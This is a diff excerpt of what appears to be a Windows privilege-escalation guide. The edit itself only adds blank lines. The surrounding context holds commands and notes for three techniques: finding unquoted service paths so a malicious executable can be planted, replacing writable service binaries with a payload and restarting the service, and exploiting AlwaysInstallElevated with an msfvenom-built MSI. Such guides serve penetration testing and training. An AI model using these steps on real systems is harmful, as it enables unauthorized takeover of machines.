@@ -47,6 +47,7 @@ Identify service paths containing spaces and lacking quotation marks.
 # Find unquoted service paths
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 ```
+
 *If a path is `C:\Program Files\My App\Service.exe` and we can write to `C:\Program Files\My App\`, we can place a malicious executable named `Service.exe` or `My.exe` (in `C:\Program Files\`) to intercept execution.*
 
 #### 2. Weak Service Permissions (Modifying Service Binaries)
@@ -70,6 +71,7 @@ Get-WmiObject win32_service | Select-Object Name, PathName | ForEach-Object {
 ```
 
 If we have write rights, we can replace the service binary with our payload, then restart the service:
+
 ```cmd
 net stop <ServiceName>
 net start <ServiceName>
@@ -103,6 +105,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 # Check HKCU
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
+
 *If both registry values return `0x1`, generate a malicious MSI file (e.g. via `msfvenom`) and execute:*
 
 ```cmd
